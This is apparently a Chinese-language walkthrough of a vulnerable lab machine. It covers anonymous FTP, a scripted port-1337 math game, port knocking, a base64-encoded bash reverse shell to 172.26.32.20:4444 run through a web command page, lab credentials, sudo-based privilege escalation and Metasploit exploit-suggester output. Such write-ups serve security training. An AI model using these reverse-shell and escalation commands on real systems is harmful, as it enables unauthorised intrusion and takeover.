
## ftp

匿名登陆ftp得到四个文件，其中一个文件提示端口1337有一个游戏



## 1337端口

```python
1000次数字游戏
import socket
import time

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip = "192.168.80.148"
port = 1337
s.connect((ip,port))

count = 0
time.sleep(1)
while count<=1001:

    data=s.recv(2048)

    print(data)

    data=data[-14:-2].decode('utf-8')

    # print(data)

    num1=data[-3]

    x=data[-7]

    num2=data[-11]

    print(f"正在计算：{num1}{x}{num2},这是第{count}次")

    # sum=0

    if x=="+":

        sum=int(num2)+int(num1)

    elif x =="*":

        sum=int(num2)*int(num1)

    elif x =="/":

        sum =int(num2)/int(num1)

    elif x =="-":

        sum = int(num2)-int(num1)

    s.send((str(sum)+"\n").encode())

    time.sleep(0.2)
    count+=1
s.close()



得到信息
Here is your gift, I hope you know what to do with it:1356, 6784, 3409

knock 192.168.80.148 1356 6784 3409

发现可以进行ssh了
用ftp得到的账户凭据进行登录nitu:81299，发现登录失败。


```
## 7331端口
>目录爆破发现一个wish目录可以执行命令，执行反弹shell

` echo "YmFzaCAtYyAnYmFzaCAtaSAmPi9kZXYvdGNwLzE3Mi4yNi4zMi4yMC80NDQ0IDA+JjEnCg==" | base64 -d | bash`

> 成功得到webshell

## 提权

>枚举/home/ntitsh/.dev/creds.txt 发现了nitish的账户密码，

ssh nitish@192.168.80.148

>得到nitish的shell，sudo -l 发现可以以sam的身份运行/usr/bin/genie 
>sudo -u sam /usr/bin/genie -cmd sam ， 发现切换到了sam用户。

sudo -l  : (root) NOPASSWD: /root/lago
是个游戏，简单尝试没有发现

查看sam家目录，发现了.pyc文件
scp ./.pyc kali@172.26.32.20:/home/work/1.pyc
uncompyle6 1.pyc 

检查源码后回到游戏中在猜数字环节输入”num“发现成功提权
























/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/genie
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/sudo
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/ping
/bin/mount
/bin/fusermount
/bin/umount
/bin/su


cat creds.txt
nitish:p4ssw0rdStr3r0n9



 exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec                Yes                      The target is vulnerable.
 2   exploit/linux/local/docker_cgroup_escape                           Yes                      The target is vulnerable. IF host OS is Ubuntu, kernel version 4.15.0-66-generic is vulnerable
 3   exploit/linux/local/nested_namespace_idmap_limit_priv_esc          Yes                      The target appears to be vulnerable.
 4   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.
 5   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
 6   exploit/linux/local/sudoedit_bypass_priv_esc                       Yes                      The target appears to be vulnerable. Sudo 1.8.21p2.pre.3ubuntu1.1 is vulnerable, but unable to determine editable file. OS can NOT be exploited by this module